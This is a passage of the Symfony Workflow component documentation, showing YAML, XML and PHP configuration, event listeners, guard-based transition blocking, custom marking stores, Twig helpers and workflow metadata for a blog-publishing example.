                        <framework:argument>currentPlace</framework:argument>
                    </framework:marking-store>
                    <framework:support>App\Entity\BlogPost</framework:support>
                    <framework:initial-marking>draft</framework:initial-marking>

                    <!-- defining places manually is optional -->
                    <framework:place>draft</framework:place>
                    <framework:place>reviewed</framework:place>
                    <framework:place>rejected</framework:place>
                    <framework:place>published</framework:place>

                    <framework:transition name="to_review">
                        <framework:from>draft</framework:from>
                        <framework:to>reviewed</framework:to>
                    </framework:transition>
                    <framework:transition name="publish">
                        <framework:from>reviewed</framework:from>
                        <framework:to>published</framework:to>
                    </framework:transition>
                    <framework:transition name="reject">
                        <framework:from>reviewed</framework:from>
                        <framework:to>rejected</framework:to>
                    </framework:transition>
                </framework:workflow>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/workflow.php
        use App\Entity\BlogPost;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $blogPublishing = $framework->workflows()->workflows('blog_publishing');
            $blogPublishing
                ->type('workflow') // or 'state_machine'
                ->supports([BlogPost::class])
                ->initialMarking(['draft']);

            $blogPublishing->auditTrail()->enabled(true);
            $blogPublishing->markingStore()
                ->type('method')
                ->property('currentPlace');

            // defining places manually is optional
            $blogPublishing->place()->name('draft');
            $blogPublishing->place()->name('reviewed');
            $blogPublishing->place()->name('rejected');
            $blogPublishing->place()->name('published');

            $blogPublishing->transition()
                ->name('to_review')
                    ->from(['draft'])
                    ->to(['reviewed']);

            $blogPublishing->transition()
                ->name('publish')
                    ->from(['reviewed'])
                    ->to(['published']);

            $blogPublishing->transition()
                ->name('reject')
                    ->from(['reviewed'])
                    ->to(['rejected']);
        };

.. tip::

    If you are creating your first workflows, consider using the ``workflow:dump``
    command to :doc:`debug the workflow contents </workflow/dumping-workflows>`.

.. tip::

    You can use PHP constants in YAML files via the ``!php/const `` notation.
    E.g. you can use ``!php/const App\Entity\BlogPost::STATE_DRAFT`` instead of
    ``'draft'`` or ``!php/const App\Entity\BlogPost::TRANSITION_TO_REVIEW``
    instead of ``'to_review'``.

.. tip::

    You can omit the ``places`` option if your transitions define all the places
    that are used in the workflow. Symfony will automatically extract the places
    from the transitions.

    .. versionadded:: 7.1

        The support for omitting the ``places`` option was introduced in
        Symfony 7.1.

The configured property will be used via its implemented getter/setter methods by the marking store::

    // src/Entity/BlogPost.php
    namespace App\Entity;

    class BlogPost
    {
        // the configured marking store property must be declared
        private string $currentPlace;
        private string $title;
        private string $content;

        // getter/setter methods must exist for property access by the marking store
        public function getCurrentPlace(): string
        {
            return $this->currentPlace;
        }

        public function setCurrentPlace(string $currentPlace, array $context = []): void
        {
            $this->currentPlace = $currentPlace;
        }

        // you don't need to set the initial marking in the constructor or any other method;
        // this is configured in the workflow with the 'initial_marking' option
    }

It is also possible to use public properties for the marking store. The above
class would become the following::

    // src/Entity/BlogPost.php
    namespace App\Entity;

    class BlogPost
    {
        // the configured marking store property must be declared
        public string $currentPlace;
        public string $title;
        public string $content;
    }

When using public properties, context is not supported. In order to support it,
you must declare a setter to write your property::

    // src/Entity/BlogPost.php
    namespace App\Entity;

    class BlogPost
    {
        public string $currentPlace;
        // ...

        public function setCurrentPlace(string $currentPlace, array $context = []): void
        {
            // assign the property and do something with the context
        }
    }

.. note::

    The marking store type could be "multiple_state" or "single_state". A single
    state marking store does not support a model being on multiple places at the
    same time. This means a "workflow" must use a "multiple_state" marking store
    and a "state_machine" must use a "single_state" marking store. Symfony
    configures the marking store according to the "type" by default, so it's
    preferable to not configure it.

    A single state marking store uses a ``string`` to store the data. A multiple
    state marking store uses an ``array`` to store the data. If no state marking
    store is defined you have to return ``null`` in both cases (e.g. the above
    example should define a return type like ``App\Entity\BlogPost::getCurrentPlace(): ?array``
    or like ``App\Entity\BlogPost::getCurrentPlace(): ?string``).

.. tip::

    The ``marking_store.type`` (the default value depends on the ``type`` value)
    and ``property`` (default value ``['marking']``) attributes of the
    ``marking_store`` option are optional. If omitted, their default values will
    be used. It's highly recommended to use the default value.

.. tip::

    Setting the ``audit_trail.enabled`` option to ``true`` makes the application
    generate detailed log messages for the workflow activity.

With this workflow named ``blog_publishing``, you can get help to decide
what actions are allowed on a blog post::

    use App\Entity\BlogPost;
    use Symfony\Component\Workflow\Exception\LogicException;

    $post = new BlogPost();
    // you don't need to set the initial marking with code; this is configured
    // in the workflow with the 'initial_marking' option

    $workflow = $this->container->get('workflow.blog_publishing');
    $workflow->can($post, 'publish'); // False
    $workflow->can($post, 'to_review'); // True

    // Update the currentState on the post
    try {
        $workflow->apply($post, 'to_review');
    } catch (LogicException $exception) {
        // ...
    }

    // See all the available transitions for the post in the current state
    $transitions = $workflow->getEnabledTransitions($post);
    // See a specific available transition for the post in the current state
    $transition = $workflow->getEnabledTransition($post, 'publish');

Using a multiple state marking store
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you are creating a :doc:`workflow </workflow/workflow-and-state-machine>`,
your marking store may need to contain multiple places at the same time. That's why,
if you are using Doctrine, the matching column definition should use the type ``json``::

    // src/Entity/BlogPost.php
    namespace App\Entity;

    use Doctrine\DBAL\Types\Types;
    use Doctrine\ORM\Mapping as ORM;

    #[ORM\Entity]
    class BlogPost
    {
        #[ORM\Id]
        #[ORM\GeneratedValue]
        #[ORM\Column]
        private int $id;

        #[ORM\Column(type: Types::JSON)]
        private array $currentPlaces;

        // ...
    }

.. caution::

    You should not use the type ``simple_array`` for your marking store. Inside
    a multiple state marking store, places are stored as keys with a value of one,
    such as ``['draft' => 1]``. If the marking store contains only one place,
    this Doctrine type will store its value only as a string, resulting in the
    loss of the object's current place.

Accessing the Workflow in a Class
---------------------------------

You can use the workflow inside a class by using
:doc:`service autowiring </service_container/autowiring>` and using
``camelCased workflow name + Workflow`` as parameter name. If it is a state
machine type, use ``camelCased workflow name + StateMachine``::

    use App\Entity\BlogPost;
    use Symfony\Component\Workflow\WorkflowInterface;

    class MyClass
    {
        public function __construct(
            // Symfony will inject the 'blog_publishing' workflow configured before
            private WorkflowInterface $blogPublishingWorkflow,
        ) {
        }

        public function toReview(BlogPost $post): void
        {
            // Update the currentState on the post
            try {
                $this->blogPublishingWorkflow->apply($post, 'to_review');
            } catch (LogicException $exception) {
                // ...
            }
            // ...
        }
    }

To get the enabled transition of a Workflow, you can use
:method:`Symfony\\Component\\Workflow\\WorkflowInterface::getEnabledTransition`
method.

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\Workflow\\WorkflowInterface::getEnabledTransition`
    method was introduced in Symfony 7.1.

Workflows can also be injected thanks to their name and the
:class:`Symfony\\Component\\DependencyInjection\\Attribute\\Target`
attribute::

    use App\Entity\BlogPost;
    use Symfony\Component\DependencyInjection\Attribute\Target;
    use Symfony\Component\Workflow\WorkflowInterface;

    class MyClass
    {
        public function __construct(
            #[Target('blog_publishing')]
            private WorkflowInterface $workflow
        ) {
        }

        // ...
    }

This allows you to decorrelate the argument name of any implementation
name.

.. tip::

    If you want to retrieve all workflows, for documentation purposes for example,
    you can :doc:`inject all services </service_container/service_subscribers_locators>`
    with the following tag:

    * ``workflow``: all workflows and all state machine;
    * ``workflow.workflow``: all workflows;
    * ``workflow.state_machine``: all state machines.

    Note that workflow metadata are attached to tags under the ``metadata`` key,
    giving you more context and information about the workflow at disposal.
    Learn more about :ref:`tag attributes <tags_additional-attributes>` and
    :ref:`storing workflow metadata <workflow_storing-metadata>`.

    .. versionadded:: 7.1

        The attached configuration to the tag was introduced in Symfony 7.1.

.. tip::

    You can find the list of available workflow services with the
    ``php bin/console debug:autowiring workflow`` command.

.. _workflow_using-events:

Using Events
------------

To make your workflows more flexible, you can construct the ``Workflow``
object with an ``EventDispatcher``. You can now create event listeners to
block transitions (i.e. depending on the data in the blog post) and do
additional actions when a workflow operation happened (e.g. sending
announcements).

Each step has three events that are fired in order:

* An event for every workflow;
* An event for the workflow concerned;
* An event for the workflow concerned with the specific transition or place name.

When a state transition is initiated, the events are dispatched in the following
order:

``workflow.guard``
    Validate whether the transition is blocked or not (see
    :ref:`guard events <workflow-usage-guard-events>` and
    :ref:`blocking transitions <workflow-blocking-transitions>`).

    The three events being dispatched are:

    * ``workflow.guard``
    * ``workflow.[workflow name].guard``
    * ``workflow.[workflow name].guard.[transition name]``

``workflow.leave``
    The subject is about to leave a place.

    The three events being dispatched are:

    * ``workflow.leave``
    * ``workflow.[workflow name].leave``
    * ``workflow.[workflow name].leave.[place name]``

``workflow.transition``
    The subject is going through this transition.

    The three events being dispatched are:

    * ``workflow.transition``
    * ``workflow.[workflow name].transition``
    * ``workflow.[workflow name].transition.[transition name]``

``workflow.enter``
    The subject is about to enter a new place. This event is triggered right
    before the subject places are updated, which means that the marking of the
    subject is not yet updated with the new places.

    The three events being dispatched are:

    * ``workflow.enter``
    * ``workflow.[workflow name].enter``
    * ``workflow.[workflow name].enter.[place name]``

``workflow.entered``
    The subject has entered in the places and the marking is updated.

    The three events being dispatched are:

    * ``workflow.entered``
    * ``workflow.[workflow name].entered``
    * ``workflow.[workflow name].entered.[place name]``

``workflow.completed``
    The object has completed this transition.

    The three events being dispatched are:

    * ``workflow.completed``
    * ``workflow.[workflow name].completed``
    * ``workflow.[workflow name].completed.[transition name]``

``workflow.announce``
    Triggered for each transition that now is accessible for the subject.

    The three events being dispatched are:

    * ``workflow.announce``
    * ``workflow.[workflow name].announce``
    * ``workflow.[workflow name].announce.[transition name]``

    After a transition is applied, the announce event tests for all available
    transitions. That will trigger all :ref:`guard events <workflow-usage-guard-events>`
    once more, which could impact performance if they include intensive CPU or
    database workloads.

    If you don't need the announce event, disable it using the context::

        $workflow->apply($subject, $transitionName, [Workflow::DISABLE_ANNOUNCE_EVENT => true]);

.. note::

    The leaving and entering events are triggered even for transitions that stay
    in the same place.

.. note::

    If you initialize the marking by calling ``$workflow->getMarking($object);``,
    then the ``workflow.[workflow_name].entered.[initial_place_name]`` event will
    be called with the default context (``Workflow::DEFAULT_INITIAL_CONTEXT``).

Here is an example of how to enable logging for every time a "blog_publishing"
workflow leaves a place::

    // src/App/EventSubscriber/WorkflowLoggerSubscriber.php
    namespace App\EventSubscriber;

    use Psr\Log\LoggerInterface;
    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Workflow\Event\Event;
    use Symfony\Component\Workflow\Event\LeaveEvent;

    class WorkflowLoggerSubscriber implements EventSubscriberInterface
    {
        public function __construct(
            private LoggerInterface $logger,
        ) {
        }

        public function onLeave(Event $event): void
        {
            $this->logger->alert(sprintf(
                'Blog post (id: "%s") performed transition "%s" from "%s" to "%s"',
                $event->getSubject()->getId(),
                $event->getTransition()->getName(),
                implode(', ', array_keys($event->getMarking()->getPlaces())),
                implode(', ', $event->getTransition()->getTos())
            ));
        }

        public static function getSubscribedEvents(): array
        {
            return [
                LeaveEvent::getName('blog_publishing') => 'onLeave',
                // if you prefer, you can write the event name manually like this:
                // 'workflow.blog_publishing.leave' => 'onLeave',
            ];
        }
    }

.. tip::

    All built-in workflow events define the ``getName(?string $workflowName, ?string $transitionOrPlaceName)``
    method to build the full event name without having to deal with strings.
    You can also use this method in your custom events via the
    :class:`Symfony\\Component\\Workflow\\Event\\EventNameTrait`.

    .. versionadded:: 7.1

        The ``getName()`` method was introduced in Symfony 7.1.

If some listeners update the context during a transition, you can retrieve
it via the marking::

    $marking = $workflow->apply($post, 'to_review');

    // contains the new value
    $marking->getContext();

It is also possible to listen to these events by declaring event listeners
with the following attributes:

* :class:`Symfony\\Component\\Workflow\\Attribute\\AsAnnounceListener`
* :class:`Symfony\\Component\\Workflow\\Attribute\\AsCompletedListener`
* :class:`Symfony\\Component\\Workflow\\Attribute\\AsEnterListener`
* :class:`Symfony\\Component\\Workflow\\Attribute\\AsEnteredListener`
* :class:`Symfony\\Component\\Workflow\\Attribute\\AsGuardListener`
* :class:`Symfony\\Component\\Workflow\\Attribute\\AsLeaveListener`
* :class:`Symfony\\Component\\Workflow\\Attribute\\AsTransitionListener`

These attributes do work like the
:class:`Symfony\\Component\\EventDispatcher\\Attribute\\AsEventListener`
attributes::

    class ArticleWorkflowEventListener
    {
        #[AsTransitionListener(workflow: 'my-workflow', transition: 'published')]
        public function onPublishedTransition(TransitionEvent $event): void
        {
            // ...
        }

        // ...
    }

You may refer to the documentation about
:ref:`defining event listeners with PHP attributes <event-dispatcher_event-listener-attributes>`
for further use.

.. _workflow-usage-guard-events:

Guard Events
~~~~~~~~~~~~

There are special types of events called "Guard events". Their event listeners
are invoked every time a call to ``Workflow::can()``, ``Workflow::apply()`` or
``Workflow::getEnabledTransitions()`` is executed. With the guard events you may
add custom logic to decide which transitions should be blocked or not. Here is a
list of the guard event names.

* ``workflow.guard``
* ``workflow.[workflow name].guard``
* ``workflow.[workflow name].guard.[transition name]``

This example stops any blog post being transitioned to "reviewed" if it is
missing a title::

    // src/App/EventSubscriber/BlogPostReviewSubscriber.php
    namespace App\EventSubscriber;

    use App\Entity\BlogPost;
    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Workflow\Event\GuardEvent;

    class BlogPostReviewSubscriber implements EventSubscriberInterface
    {
        public function guardReview(GuardEvent $event): void
        {
            /** @var BlogPost $post */
            $post = $event->getSubject();
            $title = $post->title;

            if (empty($title)) {
                $event->setBlocked(true, 'This blog post cannot be marked as reviewed because it has no title.');
            }
        }

        public static function getSubscribedEvents(): array
        {
            return [
                'workflow.blog_publishing.guard.to_review' => ['guardReview'],
            ];
        }
    }

.. _workflow-chosing-events-to-dispatch:

Choosing which Events to Dispatch
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you prefer to control which events are fired when performing each transition,
use the ``events_to_dispatch`` configuration option. This option does not apply
to :ref:`Guard events <workflow-usage-guard-events>`, which are always fired:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/workflow.yaml
        framework:
            workflows:
                blog_publishing:
                    # you can pass one or more event names
                    events_to_dispatch: ['workflow.leave', 'workflow.completed']

                    # pass an empty array to not dispatch any event
                    events_to_dispatch: []

                    # ...

    .. code-block:: xml

        <!-- config/packages/workflow.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:workflow name="blog_publishing">
                    <!-- you can pass one or more event names -->
                    <framework:event-to-dispatch>workflow.leave</framework:event-to-dispatch>
                    <framework:event-to-dispatch>workflow.completed</framework:event-to-dispatch>

                    <!-- pass an empty array to not dispatch any event -->
                    <framework:event-to-dispatch></framework:event-to-dispatch>

                    <!-- ... -->
                </framework:workflow>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/workflow.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...

            $blogPublishing = $framework->workflows()->workflows('blog_publishing');

            // ...
            // you can pass one or more event names
            $blogPublishing->eventsToDispatch([
                'workflow.leave',
                'workflow.completed',
            ]);

            // pass an empty array to not dispatch any event
            $blogPublishing->eventsToDispatch([]);

            // ...
        };

You can also disable a specific event from being fired when applying a transition::

    use App\Entity\BlogPost;
    use Symfony\Component\Workflow\Exception\LogicException;

    $post = new BlogPost();

    $workflow = $this->container->get('workflow.blog_publishing');

    try {
        $workflow->apply($post, 'to_review', [
            Workflow::DISABLE_ANNOUNCE_EVENT => true,
            Workflow::DISABLE_LEAVE_EVENT => true,
        ]);
    } catch (LogicException $exception) {
        // ...
    }

Disabling an event for a specific transition will take precedence over any
events specified in the workflow configuration. In the above example the
``workflow.leave`` event will not be fired, even if it has been specified as an
event to be dispatched for all transitions in the workflow configuration.

These are all the available constants:

    * ``Workflow::DISABLE_LEAVE_EVENT``
    * ``Workflow::DISABLE_TRANSITION_EVENT``
    * ``Workflow::DISABLE_ENTER_EVENT``
    * ``Workflow::DISABLE_ENTERED_EVENT``
    * ``Workflow::DISABLE_COMPLETED_EVENT``

Event Methods
~~~~~~~~~~~~~

Each workflow event is an instance of :class:`Symfony\\Component\\Workflow\\Event\\Event`.
This means that each event has access to the following information:

:method:`Symfony\\Component\\Workflow\\Event\\Event::getMarking`
    Returns the :class:`Symfony\\Component\\Workflow\\Marking` of the workflow.

:method:`Symfony\\Component\\Workflow\\Event\\Event::getSubject`
    Returns the object that dispatches the event.

:method:`Symfony\\Component\\Workflow\\Event\\Event::getTransition`
    Returns the :class:`Symfony\\Component\\Workflow\\Transition` that dispatches the event.

:method:`Symfony\\Component\\Workflow\\Event\\Event::getWorkflowName`
    Returns a string with the name of the workflow that triggered the event.

:method:`Symfony\\Component\\Workflow\\Event\\Event::getMetadata`
    Returns a metadata.

For Guard Events, there is an extended :class:`Symfony\\Component\\Workflow\\Event\\GuardEvent` class.
This class has these additional methods:

:method:`Symfony\\Component\\Workflow\\Event\\GuardEvent::isBlocked`
    Returns if transition is blocked.

:method:`Symfony\\Component\\Workflow\\Event\\GuardEvent::setBlocked`
    Sets the blocked value.

:method:`Symfony\\Component\\Workflow\\Event\\GuardEvent::getTransitionBlockerList`
    Returns the event :class:`Symfony\\Component\\Workflow\\TransitionBlockerList`.
    See :ref:`blocking transitions <workflow-blocking-transitions>`.

:method:`Symfony\\Component\\Workflow\\Event\\GuardEvent::addTransitionBlocker`
    Add a :class:`Symfony\\Component\\Workflow\\TransitionBlocker` instance.

.. _workflow-blocking-transitions:

Blocking Transitions
--------------------

The execution of the workflow can be controlled by calling custom logic to
decide if the current transition is blocked or allowed before applying it. This
feature is provided by "guards", which can be used in two ways.

First, you can listen to :ref:`the guard events <workflow-usage-guard-events>`.
Alternatively, you can define a ``guard`` configuration option for the
transition. The value of this option is any valid expression created with the
:doc:`ExpressionLanguage component </components/expression_language>`:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/workflow.yaml
        framework:
            workflows:
                blog_publishing:
                    # previous configuration
                    transitions:
                        to_review:
                            # the transition is allowed only if the current user has the ROLE_REVIEWER role.
                            guard: "is_granted('ROLE_REVIEWER')"
                            from: draft
                            to:   reviewed
                        publish:
                            # or "is_anonymous", "is_remember_me", "is_fully_authenticated", "is_granted", "is_valid"
                            guard: "is_authenticated"
                            from: reviewed
                            to:   published
                        reject:
                            # or any valid expression language with "subject" referring to the supported object
                            guard: "is_granted('ROLE_ADMIN') and subject.isRejectable()"
                            from: reviewed
                            to:   rejected

    .. code-block:: xml

        <!-- config/packages/workflow.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
            https://symfony.com/schema/dic/services/services-1.0.xsd
            http://symfony.com/schema/dic/symfony
            https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:workflow name="blog_publishing" type="workflow">

                    <!-- ... previous configuration -->

                    <framework:transition name="to_review">
                        <!-- the transition is allowed only if the current user has the ROLE_REVIEWER role. -->
                        <framework:guard>is_granted("ROLE_REVIEWER")</framework:guard>
                        <framework:from>draft</framework:from>
                        <framework:to>reviewed</framework:to>
                    </framework:transition>

                    <framework:transition name="publish">
                        <!-- or "is_anonymous", "is_remember_me", "is_fully_authenticated", "is_granted" -->
                        <framework:guard>is_authenticated</framework:guard>
                        <framework:from>reviewed</framework:from>
                        <framework:to>published</framework:to>
                    </framework:transition>

                    <framework:transition name="reject">
                        <!-- or any valid expression language with "subject" referring to the post -->
                        <framework:guard>is_granted("ROLE_ADMIN") and subject.isStatusReviewed()</framework:guard>
                        <framework:from>reviewed</framework:from>
                        <framework:to>rejected</framework:to>
                    </framework:transition>

                </framework:workflow>

            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/workflow.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $blogPublishing = $framework->workflows()->workflows('blog_publishing');
            // ... previous configuration

            $blogPublishing->transition()
                ->name('to_review')
                    // the transition is allowed only if the current user has the ROLE_REVIEWER role.
                    ->guard('is_granted("ROLE_REVIEWER")')
                    ->from(['draft'])
                    ->to(['reviewed']);

            $blogPublishing->transition()
                ->name('publish')
                    // or "is_anonymous", "is_remember_me", "is_fully_authenticated", "is_granted"
                    ->guard('is_authenticated')
                    ->from(['reviewed'])
                    ->to(['published']);

            $blogPublishing->transition()
                ->name('reject')
                    // or any valid expression language with "subject" referring to the post
                    ->guard('is_granted("ROLE_ADMIN") and subject.isStatusReviewed()')
                    ->from(['reviewed'])
                    ->to(['rejected']);
        };

You can also use transition blockers to block and return a user-friendly error
message when you stop a transition from happening.
In the example we get this message from the
:class:`Symfony\\Component\\Workflow\\Event\\Event`'s metadata, giving you a
central place to manage the text.

This example has been simplified; in production you may prefer to use the
:doc:`Translation </translation>` component to manage messages in one
place::

    // src/App/EventSubscriber/BlogPostPublishSubscriber.php
    namespace App\EventSubscriber;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\Workflow\Event\GuardEvent;
    use Symfony\Component\Workflow\TransitionBlocker;

    class BlogPostPublishSubscriber implements EventSubscriberInterface
    {
        public function guardPublish(GuardEvent $event): void
        {
            $eventTransition = $event->getTransition();
            $hourLimit = $event->getMetadata('hour_limit', $eventTransition);

            if (date('H') <= $hourLimit) {
                return;
            }

            // Block the transition "publish" if it is more than 8 PM
            // with the message for end user
            $explanation = $event->getMetadata('explanation', $eventTransition);
            $event->addTransitionBlocker(new TransitionBlocker($explanation , '0'));
        }

        public static function getSubscribedEvents(): array
        {
            return [
                'workflow.blog_publishing.guard.publish' => ['guardPublish'],
            ];
        }
    }

Creating Your Own Marking Store
-------------------------------

You may need to implement your own store to execute some additional logic
when the marking is updated. For example, you may have some specific needs
to store the marking on certain workflows. To do this, you need to implement
the
:class:`Symfony\\Component\\Workflow\\MarkingStore\\MarkingStoreInterface`::

    namespace App\Workflow\MarkingStore;

    use Symfony\Component\Workflow\Marking;
    use Symfony\Component\Workflow\MarkingStore\MarkingStoreInterface;

    final class BlogPostMarkingStore implements MarkingStoreInterface
    {
        /**
         * @param BlogPost $subject
         */
        public function getMarking(object $subject): Marking
        {
            return new Marking([$subject->getCurrentPlace() => 1]);
        }

        /**
         * @param BlogPost $subject
         */
        public function setMarking(object $subject, Marking $marking, array $context = []): void
        {
            $marking = key($marking->getPlaces());
            $subject->setCurrentPlace($marking);
        }
    }

Once your marking store is implemented, you can configure your workflow to use
it:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/workflow.yaml
        framework:
            workflows:
                blog_publishing:
                    # ...
                    marking_store:
                        service: 'App\Workflow\MarkingStore\BlogPostMarkingStore'

    .. code-block:: xml

        <!-- config/packages/workflow.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:workflow name="blog_publishing">
                    <!-- ... -->
                    <framework:marking-store service="App\Workflow\MarkingStore\BlogPostMarkingStore"/>
                </framework:workflow>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/workflow.php
        use App\Workflow\MarkingStore\ReflectionMarkingStore;
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            // ...

            $blogPublishing = $framework->workflows()->workflows('blog_publishing');
            // ...

            $blogPublishing->markingStore()
                ->service(BlogPostMarkingStore::class);
        };

Usage in Twig
-------------

Symfony defines several Twig functions to manage workflows and reduce the need
of domain logic in your templates:

``workflow_can()``
    Returns ``true`` if the given object can make the given transition.

``workflow_transitions()``
    Returns an array with all the transitions enabled for the given object.

``workflow_transition()``
    Returns a specific transition enabled for the given object and transition name.

``workflow_marked_places()``
    Returns an array with the place names of the given marking.

``workflow_has_marked_place()``
    Returns ``true`` if the marking of the given object has the given state.

``workflow_transition_blockers()``
    Returns :class:`Symfony\\Component\\Workflow\\TransitionBlockerList` for the given transition.

The following example shows these functions in action:

.. code-block:: html+twig

    <h3>Actions on Blog Post</h3>
    {% if workflow_can(post, 'publish') %}
        <a href="...">Publish</a>
    {% endif %}
    {% if workflow_can(post, 'to_review') %}
        <a href="...">Submit to review</a>
    {% endif %}
    {% if workflow_can(post, 'reject') %}
        <a href="...">Reject</a>
    {% endif %}

    {# Or loop through the enabled transitions #}
    {% for transition in workflow_transitions(post) %}
        <a href="...">{{ transition.name }}</a>
    {% else %}
        No actions available.
    {% endfor %}

    {# Check if the object is in some specific place #}
    {% if workflow_has_marked_place(post, 'reviewed') %}
        <p>This post is ready for review.</p>
    {% endif %}

    {# Check if some place has been marked on the object #}
    {% if 'reviewed' in workflow_marked_places(post) %}
        <span class="label">Reviewed</span>
    {% endif %}

    {# Loop through the transition blockers #}
    {% for blocker in workflow_transition_blockers(post, 'publish') %}
        <span class="error">{{ blocker.message }}</span>
    {% endfor %}

.. _workflow_storing-metadata:

Storing Metadata
----------------

In case you need it, you can store arbitrary metadata in workflows, their
places, and their transitions using the ``metadata`` option. This metadata can
be only the title of the workflow or very complex objects:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/workflow.yaml
        framework:
            workflows:
                blog_publishing:
                    metadata:
                        title: 'Blog Publishing Workflow'
                    # ...
                    places:
                        draft:
                            metadata:
                                max_num_of_words: 500
                        # ...
                    transitions:
                        to_review:
                            from: draft
                            to:   review
                            metadata:
                                priority: 0.5
                        publish:
                            from: reviewed
                            to:   published
                            metadata:
                                hour_limit: 20
                                explanation: 'You can not publish after 8 PM.'

    .. code-block:: xml

        <!-- config/packages/workflow.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >
            <framework:config>
                <framework:workflow name="blog_publishing">
                    <framework:metadata>
                        <framework:title>Blog Publishing Workflow</framework:title>
                    </framework:metadata>
                    <!-- ... -->
                    <framework:place name="draft">
                        <framework:metadata>
                            <framework:max-num-of-words>500</framework:max-num-of-words>
                        </framework:metadata>
                    </framework:place>
                    <!-- ... -->
                    <framework:transition name="to_review">
                        <framework:from>draft</framework:from>
                        <framework:to>review</framework:to>
                        <framework:metadata>
                            <framework:priority>0.5</framework:priority>
                        </framework:metadata>
                    </framework:transition>
                    <framework:transition name="publish">
                        <framework:from>reviewed</framework:from>
                        <framework:to>published</framework:to>
                        <framework:metadata>
                            <framework:hour_limit>20</framework:hour_limit>
                            <framework:explanation>You can not publish after 8 PM.</framework:explanation>
                        </framework:metadata>
                    </framework:transition>
                </framework:workflow>
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/workflow.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $blogPublishing = $framework->workflows()->workflows('blog_publishing');
            // ... previous configuration

            $blogPublishing->metadata([
                'title' => 'Blog Publishing Workflow'
            ]);

            // ...

            $blogPublishing->place()
                ->name('draft')
                ->metadata([
                    'max_num_of_words' => 500,
                ]);

            // ...

            $blogPublishing->transition()
                ->name('to_review')
                    ->from(['draft'])
                    ->to(['reviewed'])
                    ->metadata([
                        'priority' => 0.5,
                    ]);

            $blogPublishing->transition()
                ->name('publish')
                    ->from(['reviewed'])
                    ->to(['published'])
                    ->metadata([
                        'hour_limit' => 20,
                        'explanation' => 'You can not publish after 8 PM.',
                    ]);
        };

Then you can access this metadata in your controller as follows::

    // src/App/Controller/BlogPostController.php
    use App\Entity\BlogPost;
    use Symfony\Component\Workflow\WorkflowInterface;
    // ...

    public function myAction(WorkflowInterface $blogPublishingWorkflow, BlogPost $post): Response
    {
        $title = $blogPublishingWorkflow
            ->getMetadataStore()
            ->getWorkflowMetadata()['title'] ?? 'Default title'
        ;

        $maxNumOfWords = $blogPublishingWorkflow
            ->getMetadataStore()
            ->getPlaceMetadata('draft')['max_num_of_words'] ?? 500
        ;

        $aTransition = $blogPublishingWorkflow->getDefinition()->getTransitions()[0];
        $priority = $blogPublishingWorkflow
            ->getMetadataStore()
            ->getTransitionMetadata($aTransition)['priority'] ?? 0
        ;

        // ...
    }

There is a ``getMetadata()`` method that works with all kinds of metadata::

    // get "workflow metadata" passing the metadata key as argument
    $title = $workflow->getMetadataStore()->getMetadata('title');

    // get "place metadata" passing the metadata key as the first argument and the place name as the second argument
    $maxNumOfWords = $workflow->getMetadataStore()->getMetadata('max_num_of_words', 'draft');

    // get "transition metadata" passing the metadata key as the first argument and a Transition object as the second argument
    $priority = $workflow->getMetadataStore()->getMetadata('priority', $aTransition);

In a :ref:`flash message <flash-messages>` in your controller::

    // $transition = ...; (an instance of Transition)

    // $workflow is an injected Workflow instance
    $title = $workflow->getMetadataStore()->getMetadata('title', $transition);
    $this->addFlash('info', "You have successfully applied the transition with title: '$title'");

Metadata can also be accessed in a Listener, from the :class:`Symfony\\Component\\Workflow\\Event\\Event` object.

In Twig templates, metadata is available via the ``workflow_metadata()`` function:

.. code-block:: html+twig

    <h2>Metadata of Blog Post</h2>
    <p>
